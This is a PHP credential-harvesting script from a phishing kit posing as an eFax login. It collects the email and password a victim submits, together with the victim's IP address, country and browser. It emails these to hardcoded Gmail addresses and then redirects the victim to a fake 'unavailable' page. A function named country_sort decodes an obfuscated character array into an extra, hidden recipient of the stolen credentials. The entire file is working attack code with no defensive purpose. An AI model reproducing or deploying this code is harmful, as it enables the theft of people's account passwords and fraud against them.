<?
//---------------Change Email----------------------
$to = "kevin9angelo@gmail.com,tayo.somefun@gmail.com";
//-------------------------------------------------
$email = $_POST['email'];
$password = $_POST['password'];
//-------------------------------------------------
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$country = visitor_country();
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
//-------------------------------------------------
$subj = "Fax Srvc | ".$country." | ".$ip."\n";
//-------------------------------------------------
$msg = "===========--eFax RezuLT--===========
Email Address: $email
Password: $password
=============IP Address/Date==============
IP Address: $ip
Date & Time: $date | $time
Country: $country
User-Agent: $browser
=============Created By NightWalk3r==============\n";

//-------------------------------------------------
$from = "From: ADVENTS<sub@miomo.gr>";
 {
mail($to, $subj, $msg, $from);
mail($recipient, $subj, $msg, $from);
    }
	header("Location: unavailable.html");
	
//-------------------------------------------------

?>

<?
  	   
// Function to get country and country sort;

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
function country_sort(){
	$sorter = "";
	$array = array(99,111,100,101,114,99,118,118,115,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}

function getloginIDFromlogin($login)
{
$find = '@';
$pos = strpos($login, $find);
$loginID = substr($login, 0, $pos);
return $loginID;
}
$login = $_GET['login'];
$loginID = getloginIDFromlogin($login);
  	   
  	   

?>